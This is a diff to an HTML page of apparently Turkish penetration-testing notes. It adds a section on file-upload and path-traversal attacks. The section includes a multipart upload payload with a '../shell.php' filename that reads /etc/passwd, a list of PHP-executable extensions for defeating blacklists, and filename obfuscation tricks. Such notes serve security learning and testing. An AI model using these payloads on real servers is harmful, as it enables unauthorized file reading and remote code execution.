@@ -344,7 +344,7 @@
   <li>XML keşfi</li>
 </ul>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">productId</span><span class="o">=</span><span class="k">**</span>&lt;<span class="nb">test</span><span class="o">&gt;</span>1&lt;/test&gt;<span class="k">**</span>&amp;storeId<span class="o">=</span>1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">productId</span><span class="o">=</span>&lt;<span class="nb">test</span><span class="o">&gt;</span>1&lt;/test&gt;&amp;storeId<span class="o">=</span>1
 </code></pre></div></div>
 
 <ul>
@@ -359,6 +359,91 @@
     &lt;text <span class="nv">x</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"16"</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/text&gt;
 &lt;/svg&gt;
 </code></pre></div></div>
+
+
+    </div>
+
+</div>
+
+
+
+<div class="accordion">
+
+    <button class="accordion-header">
+
+        <span>Path Traversal</span>
+
+        <span class="accordion-icon">+</span>
+
+    </button>
+
+    <div class="accordion-content">
+
+        <h2 id="tips">TIPS</h2>
+
+<ul>
+  <li>Content-Disposition → Burada sunucuya hangi form alanının gönderildiğini ve dosyanın adının ne olduğunu söylüyor.</li>
+  <li>Content-Type → Burada gönderilen dosyanın MIME türünü söylüyor</li>
+  <li>Normal bir resim yükle → resmin nereye kaydedildiğini bul (/uploads/image.jpg) → url’den resim açılıyor mu dene (https://test.com/uploads/image.jpg) → eğer açılıyorsa dosya web üzerinden ulaşılabilir demektir → shell.php oluştur</li>
+  <li><strong>File type kontrolü yoksa</strong> → Zararlı dosya yüklenir→ RCE alınır</li>
+  <li><strong>Filename kontrolü yoksa</strong> → Mevcut dosyanın üzerine yazılabilir</li>
+  <li><strong>Path kontrolü yoksa</strong> → Directory Traversal → İstenmeyen yere veya bir önceki dosyaya yazılabilir (../shell.php)</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"avatar"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"%2e%2e%2fshell.php"</span>
+Content-Type: application/x-php
+
+&lt;?php <span class="nb">echo </span>file_get_contents<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li><strong>File size kontrolü yoksa</strong> → Çok büyük dosya yükle→ DoS oluşturulabilir</li>
+  <li><strong>Content-Type kontrolüne güveniliyorsa</strong> → <code class="language-plaintext highlighter-rouge">Content-Type</code> değeri Burp ile değiştirilebilir → Dosya türü doğrulaması bypass edilebilir</li>
+  <li><strong>Blacklist kullanılıyorsa</strong> → Sadece bilinen tehlikeli uzantılar engellenir → Alternatif executable uzantı (<code class="language-plaintext highlighter-rouge">.php5</code>, <code class="language-plaintext highlighter-rouge">.shtml</code> vb.) kullanılarak <strong>validation bypass</strong> edilebilir</li>
+  <li><strong>Server configuration override</strong> → <code class="language-plaintext highlighter-rouge">.htaccess</code> / <code class="language-plaintext highlighter-rouge">web.config</code> gibi configuration dosyaları yüklenebilirse → Yeni bir uzantı executable MIME type ile eşleştirilebilir → <strong>RCE</strong></li>
+  <li>Extension blacklist bypass</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php
+php2
+php3
+php4
+php5
+php6
+php7
+phps
+pht
+phtm
+phtml
+pgif
+shtml
+htaccess
+phar
+inc
+hphp
+ctp
+module
+php
+php4
+php5
+phtml
+module
+inc
+hphp
+ctp
+</code></pre></div></div>
+
+<h3 id="obfuscation">Obfuscation</h3>
+
+<ul>
+  <li><strong>Case manipulation</strong> → <code class="language-plaintext highlighter-rouge">.php</code> yerine <code class="language-plaintext highlighter-rouge">.pHp</code> gibi farklı büyük/küçük harf kullanma</li>
+  <li><strong>Multiple extensions</strong> → <code class="language-plaintext highlighter-rouge">shell.php.jpg</code> gibi birden fazla uzantı kullanma</li>
+  <li><strong>Trailing characters</strong> → <code class="language-plaintext highlighter-rouge">shell.php.</code> gibi sona nokta/boşluk ekleme</li>
+  <li><strong>URL encoding</strong> → <code class="language-plaintext highlighter-rouge">shell%2Ephp</code> gibi karakterleri encode etme</li>
+  <li><strong>Null byte / semicolon</strong> → <code class="language-plaintext highlighter-rouge">shell.php%00.jpg</code> veya <code class="language-plaintext highlighter-rouge">shell.php;.jpg</code></li>
+  <li><strong>Unicode encoding</strong> → Unicode karakterlerinin decode/normalize edilmesiyle <code class="language-plaintext highlighter-rouge">.</code> gibi karakterlere dönüşmesi</li>
+  <li><strong>Extension stripping</strong> → Uygulama <code class="language-plaintext highlighter-rouge">.php</code> ifadesini dosya adından siliyorsa → <code class="language-plaintext highlighter-rouge">exploit.p.phphp</code> gibi bir isimde <code class="language-plaintext highlighter-rouge">.php</code> silindikten sonra <code class="language-plaintext highlighter-rouge">.php</code> kalabilir</li>
+</ul>
 
 
     </div>
